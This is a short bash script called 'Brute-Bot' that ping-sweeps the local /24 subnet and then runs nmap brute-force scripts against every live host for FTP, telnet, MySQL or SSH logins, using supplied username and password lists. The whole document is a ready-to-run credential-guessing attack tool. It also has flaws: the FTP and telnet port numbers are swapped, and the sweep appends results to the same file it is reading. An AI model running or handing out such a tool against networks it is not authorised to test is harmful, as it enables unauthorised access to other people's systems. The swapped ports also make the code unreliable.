#!/usr/bin/bash



echo "______            _             ______       _   ";
echo "| ___ \          | |            | ___ \     | |  ";
echo "| |_/ /_ __ _   _| |_ ___ ______| |_/ / ___ | |_ ";
echo "| ___ \ '__| | | | __/ _ \______| ___ \/ _ \| __|";
echo "| |_/ / |  | |_| | ||  __/      | |_/ / (_) | |_ ";
echo "\____/|_|   \__,_|\__\___|      \____/ \___/ \__|";
echo "                                                 ";
echo "                                                 ";

ifconfig | grep "broadcast" | cut -d " " -f 10 | cut -d "." -f 1,2,3 | uniq > octets.txt
echo "================================================="
cat octets.txt | while read line || [[ -n $line ]];
do
	for ip in {1..254}
	do
	ping -c 1 $line.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" >> octets.txt &
	done
done

PS3="Select protocol to bruteforce: "

select opt in ftp telnet mysql ssh quit
do

	case $opt in

		ftp)
			sudo nmap --script ftp-brute -p23 -iL octets.txt --script-args userdb=usernames.txt,passdb=passlist.txt | tee results.txt
			;;	
		
		telnet)
			sudo nmap --script telnet-brute -p21 -iL octets.txt --script-args userdb=usernames.txt,passdb=passlist.txt | tee results.txt
			;;
		
		mysql)
			sudo nmap --script mysql-brute -p3306 -iL octets.txt --script-args userdb=usernames.txt,passdb=passlist.txt | tee results.txt
			;;

		ssh)
sudo nmap --script ssh-brute -p22 -iL octets.txt --script-args userdb=usernames.txt,passdb=passlist.txt | tee results.txt
			;;

		quit)
			break
			;;
		*)
			echo "invalid option $REPLY"
	esac
done
rm octets.txt
exit

